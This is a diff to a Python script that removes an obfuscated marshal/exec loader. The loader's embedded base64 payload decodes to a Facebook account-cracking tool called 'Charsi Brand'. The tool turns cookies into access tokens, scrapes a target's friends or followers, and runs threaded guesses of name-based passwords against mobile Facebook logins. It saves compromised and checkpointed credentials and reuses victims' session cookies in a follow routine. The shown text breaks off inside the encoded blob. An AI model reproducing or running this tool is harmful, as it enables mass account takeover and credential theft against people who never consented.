@@ -1,5 +1,319 @@
-# #ENCODE_BY_QAISER_YT_TECH_QAISER
-#CHARSI BRAND
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
 
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s!\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00e\x00\x00j\x01\x00d\x02\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xd4C\x00\x00IyEvdXNyL2Jpbi9weXRob24NCiMgLSotIGNvZGluZzogdXRmLTggLSotDQoNCiIiIg0KQ29weXJpZ2h0IChjKSBDaGFyc2kgQnJhbmQgUG93ZXINCg0KUGVybWlzc2lvbiBpcyBoZXJlYnkgZ3JhbnRlZCwgZnJlZSBvZiBjaGFyZ2UsIHRvIGFueSBwZXJzb24gb2J0YWluaW5nIGEgY29weQ0Kb2YgdGhpcyBzb2Z0d2FyZSBhbmQgYXNzb2NpYXRlZCBkb2N1bWVudGF0aW9uIGZpbGVzICh0aGUgIlNvZnR3YXJlIiksIHRvIGRlYWwNCmluIHRoZSBTb2Z0d2FyZSB3aXRob3V0IHJlc3RyaWN0aW9uLCBpbmNsdWRpbmcgd2l0aG91dCBsaW1pdGF0aW9uIHRoZSByaWdodHMNCnRvIHVzZSwgY29weSwgbW9kaWZ5LCBtZXJnZSwgcHVibGlzaCwgZGlzdHJpYnV0ZSwgc3VibGljZW5zZSwgYW5kL29yIHNlbGwNCmNvcGllcyBvZiB0aGUgU29mdHdhcmUsIGFuZCB0byBwZXJtaXQgcGVyc29ucyB0byB3aG9tIHRoZSBTb2Z0d2FyZSBpcw0KZnVybmlzaGVkIHRvIGRvIHNvLCBzdWJqZWN0IHRvIHRoZSBmb2xsb3dpbmcgY29uZGl0aW9uczoNCg0KVGhlIGFib3ZlIGNvcHlyaWdodCBub3RpY2UgYW5kIHRoaXMgcGVybWlzc2lvbiBub3RpY2Ugc2hhbGwgYmUgaW5jbHVkZWQgaW4gYWxsDQpjb3BpZXMgb3Igc3Vic3RhbnRpYWwgcG9ydGlvbnMgb2YgdGhlIFNvZnR3YXJlLg0KDQpUSEUgU09GVFdBUkUgSVMgUFJPVklERUQgIkFTIElTIiwgV0lUSE9VVCBXQVJSQU5UWSBPRiBBTlkgS0lORCwgRVhQUkVTUyBPUg0KSU1QTElFRCwgSU5DTFVESU5HIEJVVCBOT1QgTElNSVRFRCBUTyBUSEUgV0FSUkFOVElFUyBPRiBNRVJDSEFOVEFCSUxJVFksDQpGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRSBBTkQgTk9OSU5GUklOR0VNRU5ULiBJTiBOTyBFVkVOVCBTSEFMTCBUSEUNCkFVVEhPUlMgT1IgQ09QWVJJR0hUIEhPTERFUlMgQkUgTElBQkxFIEZPUiBBTlkgQ0xBSU0sIERBTUFHRVMgT1IgT1RIRVINCkxJQUJJTElUWSwgV0hFVEhFUiBJTiBBTiBBQ1RJT04gT0YgQ09OVFJBQ1QsIFRPUlQgT1IgT1RIRVJXSVNFLCBBUklTSU5HIEZST00sDQpPVVQgT0YgT1IgSU4gQ09OTkVDVElPTiBXSVRIIFRIRSBTT0ZUV0FSRSBPUiBUSEUgVVNFIE9SIE9USEVSIERFQUxJTkdTIElOIFRIRQ0KU09GVFdBUkUuDQoiIiINCg0KaW1wb3J0IHJlcXVlc3RzLCByZSwgb3MsIHJhbmRvbSwgc3lzDQpmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cA0KZnJvbSByYW5kb20gaW1wb3J0IGNob2ljZQ0KZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvcg0KZnJvbSB0aW1lIGltcG9ydCB0aW1lIGFzIG1law0KDQojIGRhdGEgLSBkYXRhDQpQID0gIlx4MWJbMDs5N20iIA0KTSA9ICJceDFiWzA7OTFtIg0KSCA9ICJceDFiWzA7OTJtIg0KSyA9ICJceDFiWzA7OTNtIg0KQiA9ICJceDFiWzA7OTRtIg0KQk0gPSAiXHgxYlswOzk2bSINCmxvb3AsIG9rLCBjcCA9IFtdLFtdLFtdDQpvcHNpID0gW10NCmRhdGFfaWQgPSBOb25lDQoNCiMgY29udmVydCBjb29raWVzIHRvIHRva2VuDQpkZWYgY29udmVydChjb29raWUpOg0KCWNvb2tpZXMgPSB7ImNvb2tpZSI6Y29va2llfQ0KCXJlcyA9IHJlcXVlc3RzLlNlc3Npb24oKS5nZXQoJ2h0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tL2J1c2luZXNzX2xvY2F0aW9ucycsIGhlYWRlcnMgPSB7DQoJCSd1c2VyLWFnZW50Jwk6CSdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4xLjA7IE1JIDggQnVpbGQvT1BNMS4xNzEwMTkuMDExKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNjkuMC4zNDk3Ljg2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywNCgkJJ3JlZmVyZXInCToJJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8nLA0KCQknaG9zdCcJOgknYnVzaW5lc3MuZmFjZWJvb2suY29tJywNCgkJJ29yaWdpbicJOgknaHR0cHM6Ly9idXNpbmVzcy5mYWNlYm9vay5jb20nLA0KCQkndXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cycJOgknMScsDQoJCSdhY2NlcHQtbGFuZ3VhZ2UnCToJJ2lkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywNCgkJJ2NhY2hlLWNvbnRyb2wnCToJJ21heC1hZ2U9MCcsDQoJCSdhY2NlcHQnCToJJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KCQknY29udGVudC10eXBlJwk6CSd0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgnDQoJfSwgY29va2llcyA9IGNvb2tpZXMpDQoJdHJ5Og0KCQl0b2tlbiA9IHJlLnNlYXJjaCgnKEVBQUdcdyspJyxzdHIocmVzLnRleHQpKS5ncm91cCgxKQ0KCWV4Y2VwdDoNCgkJdG9rZW4gPSAiQ29va2llcyBJbnZhbGlkIg0KCWZpbmFsbHk6DQoJCXJldHVybiB0b2tlbg0KCQkNCmRlZiByZWFsX3RpbWUoKToNCglyZXR1cm4gc3RyKG1laygpKS5zcGxpdCgnLicpWzBdDQoJCQ0KZGVmIHNlc2koc2Vzc2lvbixyZXMpOg0KCXJlc3BvbnNlID0gQmVhdXRpZnVsU291cChyZXMsJ2h0bWwucGFyc2VyJykNCglmb3JtID0gcmVzcG9uc2UuZmluZCgnZm9ybScseydtZXRob2QnOidwb3N0J30pDQoJZGF0YSA9IHt4LmdldCgnbmFtZScpOnguZ2V0KCd2YWx1ZScpIGZvciB4IGluIGZvcm0uZmluZF9hbGwoJ2lucHV0Jyx7J3R5cGUnOlsnaGlkZGVuJywnc3VibWl0J119KX0NCglyID0gQmVhdXRpZnVsU291cChzZXNzaW9uLnBvc3QoJ2h0dHBzOi8vbS5mYWNlYm9vay5jb20nK2Zvcm0uZ2V0KCdhY3Rpb24nKSxkYXRhPWRhdGEpLnRleHQsICdodG1sLnBhcnNlcicpDQoJZm9yIGkgaW4gci5maW5kX2FsbCgnb3B0aW9uJyk6DQoJCW9wc2kuYXBwZW5kKGkudGV4dCkNCglyZXR1cm4gb3BzaQ0KDQpjbGFzcyBNYWluOg0KCQ0KCWRlZiBfX2luaXRfXyhzZWxmLCoqa3dhcmdzKToNCgkJc2VsZi5jb2tpLCBzZWxmLnRva2VuID0geyJjb29raWUiOmt3YXJnc1snY29raSddfSwga3dhcmdzWyd0b2tlbiddDQoJCXNlbGYuZGF0YV9pZCA9IFtdDQoJCXNlbGYubWJhc2ljID0gImh0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbSINCgkNCglAcHJvcGVydHkNCglkZWYgZ2V0X215X2luZm8oc2VsZik6DQoJCXIgPSByZXF1ZXN0cy5nZXQoZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZT9maWVsZHM9bmFtZSxpZCZhY2Nlc3NfdG9rZW49e3NlbGYudG9rZW59Iixjb29raWVzPXNlbGYuY29raSkuanNvbigpDQoJCXNlbGYubmFtZSxzZWxmLmlkID0gclsnbmFtZSddLCByWydpZCddDQoJCXJldHVybiB7J25hbWUnOnNlbGYubmFtZSwgJ2lkJzpzZWxmLmlkfQ0KCQkJDQoJCQ0KCUBwcm9wZXJ0eQ0KCWRlZiBNZW51KHNlbGYpOg0KCQl0cnk6DQoJCQlpbmZvID0gc2VsZi5nZXRfbXlfaW5mbw0KCQlleGNlcHQgS2V5RXJyb3I6DQoJCQlvcy5yZW1vdmUoImRhdGEvdG9rZW4iKTtvcy5yZW1vdmUoImRhdGEvY29raSIpDQoJCQlleGl0KCIgISBZb3VyIHRva2VuIEV4cGlyZWQgISAiKQ0KCQlwcmludCgNCgkJCWYiID4+IFlvdXIgQWNjb3VudDoge2luZm9bJ25hbWUnXX0sIHtpbmZvWydpZCddfSA8PCAiDQoJCSkNCgkJcHJpbnQoDQoJCQkiIiINCgkgICAxLikgQ3JhY2sgZnJvbSBmcmllbmRzIGxpc3QgXQ0KCSAgIDIuKSBDcmFjayBmcm9tIGZvbGxvd2VycyBsaXN0IF0NCgkgICAzLikgQ2hlY2sgcmVzdWx0cyBPSy9DUF0NCgkgICAwLikgTG9nb3V0IGFjY291bnQgKGNvb2tpZXMpXQ0KCQkJIiIiDQoJCSkNCgkJY2hvc2UgPSBpbnB1dCgiID4gQ2hvc2VlOiAiKQ0KCQludW1iZXJfbGlzdCA9IFsnMCcsJzEnLCcyJywnMyddDQoJCXdoaWxlIGNob3NlIG5vdCBpbiBudW1iZXJfbGlzdDoNCgkJCXByaW50KCcgISBZb3VyIENob3NlIE5vdCBGb3VuZCAhJykNCgkJCWNob3NlID0gaW5wdXQoIiA+IENob3NlZTogIikNCgkJaWYgY2hvc2U9PScxJyBvciBjaG9zZT09JzInOg0KCQkJaWYgY2hvc2U9PScxJzpwcmludCgiXG4gPvCfmIg8IENyYWNrIGZyb20gZnJpZW5kcyBsaXN0IFNlbGVjdGVkID7wn5iIPCIpDQoJCQllbHNlOnByaW50KCJcbiA+8J+YiDwgQ3JhY2sgZnJvbSBmb2xsb3dlcnMgbGlzdCBTZWxlY3RlZCA+8J+YiDwiKQ0KCQkJYWNjb3VudF90YXJnZXQgPSBpbnB1dCgiID4+IFRhcmdldCBpZDogIikNCgkJCXRyeToNCgkJCQlyID0gcmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve2FjY291bnRfdGFyZ2V0fT9maWVsZHM9bmFtZSxpZCZhY2Nlc3NfdG9rZW49e3NlbGYudG9rZW59Iixjb29raWVzPXNlbGYuY29raSkuanNvbigpDQoJCQkJdGFyZ2V0X25hbWUgPSByWyduYW1lJ10NCgkJCQlwcmludChmIiA+IFRhcmdldCBuYW1lOiB7dGFyZ2V0X25hbWV9IikNCgkJCWV4Y2VwdCBLZXlFcnJvcjoNCgkJCQlleGl0KCIgISBUYXJnZXQgTm90IEZvdW5kICEgIikNCgkJCWlmIGNob3NlPT0nMSc6c2VsZi5kdW1wQWNjb3VudCh1cmw9ZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS97YWNjb3VudF90YXJnZXR9P2ZpZWxkcz1mcmllbmRzLmZpZWxkcyhuYW1lLGlkKSZhY2Nlc3NfdG9rZW49e3NlbGYudG9rZW59IixjaG9zZT0iZnJpZW5kcyIpDQoJCQllbHNlOnNlbGYuZHVtcEFjY291bnQodXJsPWYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20ve2FjY291bnRfdGFyZ2V0fT9maWVsZHM9c3Vic2NyaWJlcnMubGltaXQoNTAwMCkmYWNjZXNzX3Rva2VuPXtzZWxmLnRva2VufSIsY2hvc2U9ImZvbGxvd2VycyIpDQoJCQlzZWxmLnZhbGlkYXRlDQoJCWVsaWYgY2hvc2U9PScwJzoNCgkJCW9zLnJlbW92ZSgnZGF0YS90b2tlbicpO29zLnJlbW92ZSgnZGF0YS9jb2tpJykNCgkJCWV4aXQoZidcbiDiiJogTG9nb3V0IFN1Y2Nlc3MsIGJ5ZSB7c2VsZi5uYW1lfScpDQoJCWVsc2U6DQoJCQlwcmludCgnXG4gPvCfmIg8IENoZWNrIFJlc3VsdHMgT0sgJiBDUCA+8J+YiDwnKQ0KCQkJdHJ5Og0KCQkJCXByaW50KCcgPj4gT0sgcmVzdWx0cyA6JykNCgkJCQlmb3IgeCBpbiBvcGVuKCdkYXRhL29rJywncicpLnJlYWRsaW5lcygpOg0KCQkJCQlwcmludChmJyA+IHt4fScpDQoJCQlleGNlcHQ6cHJpbnQoJyA+IFJlc3VsdHMgMCAnKQ0KCQkJcHJpbnQoDQoJCQkJIiIsIj48IioyNQ0KCQkJKQ0KCQkJdHJ5Og0KCQkJCXByaW50KCcgPj4gQ1AgcmVzdWx0cyA6JykNCgkJCQlmb3IgeCBpbiBvcGVuKCdkYXRhL2NwJywncicpLnJlYWRsaW5lcygpOg0KCQkJCQlwcmludChmJyA+IHt4fScpDQoJCQlleGNlcHQ6cHJpbnQoJyA+IFJlc3VsdHMgMCAnKQ0KCQkJCQ0KCQkJDQpjbGFzcyBDcmFjazoNCgkNCglkZWYgY3JhY2soc2VsZiwgdXNlciwgcGFzc3dvcmRfbGlzdCwgdXJsKToNCgkJc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KCQlmb3IgcHcgaW4gcGFzc3dvcmRfbGlzdDoNCgkJCXIgPSBCZWF1dGlmdWxTb3VwKHNlc3Npb24uZ2V0KGYie3VybH0vbG9naW4vZGV2aWNlLWJhc2VkL3Bhc3N3b3JkLz91aWQ9e3VzZXJ9JmZsb3c9bG9naW5fbm9fcGluJnJlZnNyYz1kZXByZWNhdGVkJl9yZHIiLCBoZWFkZXJzPXsNCgkJCQknSG9zdCcJOgknbWJhc2ljLmZhY2Vib29rLmNvbScsDQoJCQkJJ0Nvbm5lY3Rpb24nCToJJ2tlZXAtYWxpdmUnLA0KCQkJCSdDYWNoZS1Db250cm9sJwk6CSdtYXgtYWdlPTAnLA0KCQkJCSdzZWMtY2gtdWEnCToJJyIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSIxMDEiJywNCgkJCQknc2VjLWNoLXVhLW1vYmlsZScJOgknPzEnLA0KCQkJCSdzZWMtY2gtdWEtcGxhdGZvcm0nCToJJyJBbmRyb2lkIicsDQoJCQkJJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnCToJJzEnLA0KCQkJCSdVc2VyLUFnZW50Jwk6CSdNb3ppbGxhLzUuMCAoTW9iaWxlOyBydjo0OC4wOyBBNDA1REwpIEdlY2tvLzQ4LjAgRmlyZWZveC80OC4wIEtBSU9TLzIuNScsDQoJCQkJJ0FjY2VwdCcJOgkndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywNCgkJCQknU2VjLUZldGNoLVNpdGUnCToJJ3NhbWUtb3JpZ2luJywNCgkJCQknU2VjLUZldGNoLU1vZGUnCToJJ25hdmlnYXRlJywNCgkJCQknU2VjLUZldGNoLVVzZXInCToJJz8xJywNCgkJCQknU2VjLUZldGNoLURlc3QnCToJJ2RvY3VtZW50JywNCgkJCQknUmVmZXJlcicJOgknaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC8nLA0KCQkJCSdBY2NlcHQtRW5jb2RpbmcnCToJJ2d6aXAsIGRlZmxhdGUnLA0KCQkJCSdBY2NlcHQtTGFuZ3VhZ2UnCToJJ2lkLUlELGlkO3E9MC45Jw0KCQkJfSkudGV4dCwgJ2h0bWwucGFyc2VyJykNCgkJCWRhdGEgPSB7Xy5nZXQoJ25hbWUnKTpfLmdldCgndmFsdWUnKSBmb3IgXyBpbiByLmZpbmQoJ2Zvcm0nLHsnbWV0aG9kJzoncG9zdCd9KS5maW5kQWxsKCdpbnB1dCcseyduYW1lJzpbJ2xzZCcsJ2phem9lc3QnXX0pfQ0KCQkJZGF0YS51cGRhdGUoDQoJCQkJew0KCQkJCQkndWlkJzp1c2VyLA0KCQkJCQknbmV4dCc6J2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9zYXZlLWRldmljZS8nLA0KCQkJCQknZmxvdyc6J2xvZ2luX25vX3BpbicsDQoJCQkJCSdlbmNwYXNzJzonI1BXRF9CUk9XU0VSOjA6e306e30nLmZvcm1hdChyZWFsX3RpbWUoKSxwdykNCgkJCQl9DQoJCQkpDQoJCQlzZXNzaW9uLnBvc3QoZid7dXJsfS9sb2dpbi9kZXZpY2UtYmFzZWQvdmFsaWRhdGUtcGFzc3dvcmQvJywgZGF0YT1kYXRhLCBoZWFkZXJzPXsNCgkJCQknSG9zdCcJOgknbWJhc2ljLmZhY2Vib29rLmNvbScsDQoJCQkJJ0Nvbm5lY3Rpb24nCToJJ2tlZXAtYWxpdmUnLA0KCQkJCSdDb250ZW50LUxlbmd0aCcJOgknMTQyJywNCgkJCQknQ2FjaGUtQ29udHJvbCcJOgknbWF4LWFnZT0wJywNCgkJCQknc2VjLWNoLXVhJwk6CSciIE5vdCBBO0JyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iMTAxIicsDQoJCQkJJ3NlYy1jaC11YS1tb2JpbGUnCToJJz8xJywNCgkJCQknc2VjLWNoLXVhLXBsYXRmb3JtJwk6CSciQW5kcm9pZCInLA0KCQkJCSdVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzJwk6CScxJywNCgkJCQknT3JpZ2luJwk6CSdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20nLA0KCQkJCSdDb250ZW50LVR5cGUnCToJJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcsDQoJCQkJJ1VzZXItQWdlbnQnCToJJ05va2lhQzMtMDAvNS4wICgwOC42MykgUHJvZmlsZS9NSURQLTIuMSBDb25maWd1cmF0aW9uL0NMREMtMS4xIE1vemlsbGEvNS4wIEFwcGxlV2ViS2l0LzQyMCsgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYWZhcmkvNDIwKycsDQoJCQkJJ0FjY2VwdCcJOgkndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywNCgkJCQknU2VjLUZldGNoLVNpdGUnCToJJ3NhbWUtb3JpZ2luJywNCgkJCQknU2VjLUZldGNoLU1vZGUnCToJJ25hdmlnYXRlJywNCgkJCQknU2VjLUZldGNoLVVzZXInCToJJz8xJywNCgkJCQknU2VjLUZldGNoLURlc3QnCToJJ2RvY3VtZW50JywNCgkJCQknUmVmZXJlcicJOglmJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcGFzc3dvcmQvP3VpZD17dXNlcn0mZmxvdz1sb2dpbl9ub19waW4mcmVmc3JjPWRlcHJlY2F0ZWQmX3JkcicsDQoJCQkJJ0FjY2VwdC1FbmNvZGluZycJOgknZ3ppcCwgZGVmbGF0ZSwgYnInLA0KCQkJCSdBY2NlcHQtTGFuZ3VhZ2UnCToJJ2lkLUlELGlkO3E9MC45Jw0KCQkJfSkNCgkJCWlmICJjX3VzZXIiIGluIHNlc3Npb24uY29va2llcy5nZXRfZGljdCgpOg0KCQkJCW9rLmFwcGVuZCh1c2VyKyJ8IitwdykNCgkJCQlvcGVuKCJkYXRhL29rIiwiYSIpLndyaXRlKHVzZXIrInwiK3B3KyJcbiIpDQoJCQkJY29raSA9ICc7Jy5qb2luKFsiJXM9JXMiJShrLHYpIGZvciBrLHYgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCkuaXRlbXMoKV0pDQoJCQkJc2VsZi5mb2xsb3dfbWUoY29raSkNCgkJCQlzeXMuc3Rkb3V0LndyaXRlKCdcbiVzXHIg4oiaIEFjY291bnQgU2FmZVxuID4gRW1haWw6ICVzXG4gPiBQYXNzOiAlc1xuIF4gTmdlbnRvdCBMdSBeXG4lcyclKEgsdXNlcixwdyxQKSkNCgkJCQlzeXMuc3Rkb3V0LmZsdXNoKCkNCgkJCQlicmVhaw0KCQkJZWxpZiAiY2hlY2twb2ludCIgaW4gc2Vzc2lvbi5jb29raWVzLmdldF9kaWN0KCk6DQoJCQkJY3AuYXBwZW5kKHVzZXIrInwiK3B3KQ0KCQkJCW9wZW4oImRhdGEvY3AiLCJhIikud3JpdGUodXNlcisifCIrcHcrIlxuIikNCgkJCQloMiA9IHsNCgkJCQkJJ2hvc3QnOidtYmFzaWMuZmFjZWJvb2suY29tJywnYWNjZXB0JzondGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44LGFwcGxpY2F0aW9uL3NpZ25lZC1leGNoYW5nZTt2PWIzO3E9MC45JywnYWNjZXB0LWVuY29kaW5nJzonZ3ppcCwgZGVmbGF0ZScsJ2FjY2VwdC1sYW5ndWFnZSc6J2lkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43JywnY2FjaGUtY29udHJvbCc6J21heC1hZ2U9MCcsJ29yaWdpbic6J2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbScsJ3JlZmVyZXInOidodHRwczovL3d3dy5mYWNlYm9vay5jb20nLCdzZWMtY2gtdWEnOiciIE5vdCBBO0JyYW5kIjt2PSI5OSIsICJDaHJvbWl1bSI7dj0iMTAxIicsJ3VwZ3JhZGUtaW5zZWN1cmUtcmVxdWVzdHMnOicxJywndXNlci1hZ2VudCc6J01vemlsbGEvNS4wIChNb2JpbGU7IHJ2OjQ4LjA7IEE0MDVETCkgR2Vja28vNDguMCBGaXJlZm94LzQ4LjAgS0FJT1MvMi41Jw0KCQkJCX0NCgkJCQlyZXMgPSBzZXNzaW9uLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2xvZ2luLz9uZXh0JnJlZj1kYmwmZmwmcmVmaWQ9OCcsaGVhZGVycyA9IGgyKS50ZXh0DQoJCQkJcmVzcyA9IEJlYXV0aWZ1bFNvdXAocmVzLCAnaHRtbC5wYXJzZXInKQ0KCQkJCWZvcm0gPSByZXNzLmZpbmQoJ2Zvcm0nLHsnbWV0aG9kJzoncG9zdCd9KQ0KCQkJCWRhdGEyID0ge3guZ2V0KCduYW1lJyk6eC5nZXQoJ3ZhbHVlJykgZm9yIHggaW4gZm9ybS5maW5kX2FsbCgnaW5wdXQnLHsndHlwZSc6WydzdWJtaXQnLCdoaWRkZW4nXX0pfQ0KCQkJCWRhdGEyLnVwZGF0ZSh7DQoJCQkJCSdlbWFpbCc6dXNlciwNCgkJCQkJJ3Bhc3MnOnB3DQoJCQkJfSkNCgkJCQlyZXMgPSBzZXNzaW9uLnBvc3QoJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbScrZm9ybS5nZXQoJ2FjdGlvbicpLGRhdGE9ZGF0YTIsaGVhZGVycz1oMikudGV4dA0KCQkJCXJlc3MgPSBCZWF1dGlmdWxTb3VwKHJlcywgJ2h0bWwucGFyc2VyJykNCgkJCQlpZiAnVmlldyB0aGUgbG9naW4gZGV0YWlscyBkaXNwbGF5ZWQuIFRoaXMgeW91PycgaW4gc3RyKHJlc3MuZmluZCgndGl0bGUnKS50ZXh0KToNCgkJCQkJb3BlbigidWEiLCJhIikud3JpdGUoIiVzfCVzIiUodXNlcixwdykpDQoJCQkJCXN5cy5zdGRvdXQud3JpdGUoJ1xuJXNcciDinJMgQWNjb3VudCB0YXAgeWVzXG4gPiBFbWFpbDogJXNcbiA+IFBhc3M6ICVzXG4gJXMnJShILHVzZXIscHcsUCkpDQoJCQkJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQkJCWVsc2U6DQoJCQkJCWlmKGxlbihzZXNpKHNlc3Npb24scmVzKSk9PTApOg0KCQkJCQkJaWYgJ0VudGVyIHRoZSBMb2dpbiBDb2RlIHRvIENvbnRpbnVlJyBpbiBzdHIocmVzcy5maW5kKCd0aXRsZScpLnRleHQpOg0KCQkJCQkJCXN5cy5zdGRvdXQud3JpdGUoJ1xuJXNcciDDlyBBY2NvdW50IGEyZiBvblxuID4gRW1haWw6ICVzXG4gPiBQYXNzOiAlc1xuIF4gQnVhbmcgQWphIF5cbiVzJyUoTSx1c2VyLHB3LFApKQ0KCQkJCQkJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQkJCQllbHNlOg0KCQkJCQkJc3lzLnN0ZG91dC53cml0ZSgnXG4lc1xyIMOXIEFjY291bnQgY2hlY2twb2ludFxuID4gRW1haWw6ICVzXG4gPiBQYXNzOiAlc1xuID4gT3B0aW9uOiAlcyA+ICVzXG4lcyclKEssdXNlcixwdyxsZW4ob3BzaSksJywgJy5qb2luKG9wc2kpLFApKQ0KCQkJCQkJc3lzLnN0ZG91dC5mbHVzaCgpDQoJCQkJb3BzaS5jbGVhcigpDQoJCQkJYnJlYWsNCgkJCXN5cy5zdGRvdXQud3JpdGUoIlxy4pyTW0NoYXJzaV0g8J+YiENSQUNLIFNUQVJUICVzLyVzIE9LL0NQOi0lcy8lcyIlKGxlbihsb29wKSxsZW4oZGF0YV9pZCksbGVuKG9rKSxsZW4oY3ApKSkNCgkJCXN5cy5zdGRvdXQuZmx1c2goKQ0KCQlsb29wLmFwcGVuZCgibWVtZWsiKQ0KDQpjbGFzcyBBc3NldHMoTWFpbik6DQoJDQoJQHByb3BlcnR5DQoJZGVmIF9wYXNzd29yZF9zcGxpdChzZWxmKToNCgkJcHJpbnQoIlxuID7wn5iIPCBBZGR0aW9uYWwgcGFzc3dvcmQsICAoLCkgPvCfmIg8IFxuID4+IGV4YW1wbGU6IHF3ZXJ0eSxsYXRpZiBoYXJrYXQsYW5qaW5nXG4gPiEgUGFzc3dvcmQgbXVzdCBiZSBtb3JlIHRoYW4gNiBjaGFyYWN0ZXJzXG4iKQ0KCQlfcGFzc3dvcmQgPSBpbnB1dCgiID4gQWRkIHBhc3M6ICIpO3ByaW50KCIiKQ0KCQlyZXR1cm4gX3Bhc3N3b3JkLnNwbGl0KCIsIikNCg0KCUBwcm9wZXJ0eQ0KCWRlZiB2YWxpZGF0ZShzZWxmKToNCgkJYWRkID0gaW5wdXQoIiA+PiBbeS9uXSBBZGR0aW9uYWwgcGFzc3dvcmQ/ICIpDQoJCWlmIGFkZD09InkiOg0KCQkJcGFzID0gc2VsZi5fcGFzc3dvcmRfc3BsaXQNCgkJcHJpbnQoDQoJCQkiID7wn5iIPCBDcmFjayBSdW5uaW5nLCAoQ1RSTCArIEMpIHRvIHN0b3BwZWQgPvCfmIg8XG4iDQoJCSkNCgkJd2l0aCBUaHJlYWRQb29sRXhlY3V0b3IobWF4X3dvcmtlcnM9MzUpIGFzIGtpcmltOg0KCQkJZm9yIHggaW4gc2VsZi5kYXRhX2lkOg0KCQkJCXggPSB4Lmxvd2VyKCkNCgkJCQluYW1lZSxpZCA9IHguc3BsaXQoJz48JykNCgkJCQluYW1lID0gbmFtZWUuc3BsaXQoIiAiKQ0KCQkJCWlmKGxlbihuYW1lWzBdKT49Nik6DQoJCQkJCV9fcGFzc3dvcmRfbGlzdCA9IFtuYW1lZSxuYW1lWzBdKycxMjMnLG5hbWVbMF0rJzEyMzQnLG5hbWVbMF0rJzEyMzQ1J10NCgkJCQllbGlmKGxlbihuYW1lWzBdKTw9Mik6DQoJCQkJCV9fcGFzc3dvcmRfbGlzdCA9IFtuYW1lZSxuYW1lWzBdKycxMjM0JyxuYW1lWzBdKycxMjM0NSddDQoJCQkJZWxzZToNCgkJCQkJX19wYXNzd29yZF9saXN0ID0gW25hbWVlLG5hbWVbMF0rJzEyMycsbmFtZVswXSsnMTIzNCcsbmFtZVswXSsnMTIzNDUnXQ0KCQkJCWlmIGFkZD09InkiOg0KCQkJCQlfX3Bhc3N3b3JkX2xpc3QgPSBfX3Bhc3N3b3JkX2xpc3QgKyBwYXMNCgkJCQlraXJpbS5zdWJtaXQoQ3JhY2soKS5jcmFjaywgaWQsIF9fcGFzc3dvcmRfbGlzdCwgc2VsZi5tYmFzaWMpDQoJCWV4aXQoDQoJCQkiIFtwcm9ncmFtIGZpbmlzaGVkXSBjcmFjayBmaW5pc2hlZCwgQ2hhcnNpIEJyYW5kOnYiDQoJCSkNCgkNCglkZWYgZHVtcEFjY291bnQoc2VsZiwqKmxhdGlmX2dhbnRlbmcpOg0KCQlnbG9iYWwgZGF0YV9p